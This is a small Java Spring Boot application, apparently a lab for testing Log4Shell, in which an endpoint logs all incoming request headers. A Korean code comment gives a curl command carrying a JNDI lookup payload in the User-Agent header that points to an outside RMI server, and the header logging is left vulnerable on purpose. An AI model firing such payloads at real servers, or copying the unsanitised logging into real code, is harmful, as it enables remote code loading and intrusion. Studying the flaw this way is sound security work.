package org.harm.app;

import lombok.extern.slf4j.Slf4j;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RestController;

import java.util.Map;
import java.util.Optional;

@Slf4j
@SpringBootApplication
@RestController
public class MainApp {
    public static void main(String[] args) {
        SpringApplication.run(MainApp.class);
    }

    /**
     * 아래와 같이 호출하게 되면, header value 에는 proxy 객체가 담겨서 오게된다.
     * 그런데 실제 method invoke 는 할 수 없다. 내부적으로 변경이됨.
     * curl -v -X GET \
     * --header 'User-Agent: ${jndi:rmi://192.168.1.6:1099/HelloService}' \
     * http://localhost:8080/doService/wow
     *
     *
     * */
    @GetMapping("/doService/{something}")
    public String doService(@PathVariable("something") String something, @RequestHeader Map<String, Object> header) {
        log.info("do service with {}", something);
        log.info("header info");
        header.entrySet().stream().forEach(stringStringEntry -> {
            log.info("header key {} value {}", stringStringEntry.getKey(), stringStringEntry.getValue());
            if(stringStringEntry.getKey().equals("attack-here")) {
                Object obj = stringStringEntry.getValue();
                log.info("obj : {}", obj);
            }
        });
        return "serviced(" + something + ")";
    }

    @GetMapping(value = { "/healthcheck", "/healthcheck/{name}"})
    public ResponseEntity hello(@PathVariable(required = false, value = "name") Optional<String> name) {
        log.info("hello, {}", name.orElse("me"));
        return ResponseEntity.ok().build();
    }
}
